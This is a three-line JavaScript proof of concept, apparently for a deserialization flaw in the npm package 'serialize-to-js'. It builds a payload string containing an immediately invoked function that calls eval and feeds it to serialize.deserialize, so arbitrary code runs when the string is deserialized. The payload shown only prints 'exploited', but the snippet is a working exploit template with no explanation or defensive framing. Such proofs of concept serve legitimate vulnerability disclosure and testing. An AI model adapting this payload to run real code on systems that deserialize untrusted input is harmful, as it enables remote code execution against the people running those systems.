var payload = "{e: (function(){ eval('console.log(`exploited`)') })() }" 
var serialize = require('serialize-to-js'); 
serialize.deserialize(payload); 
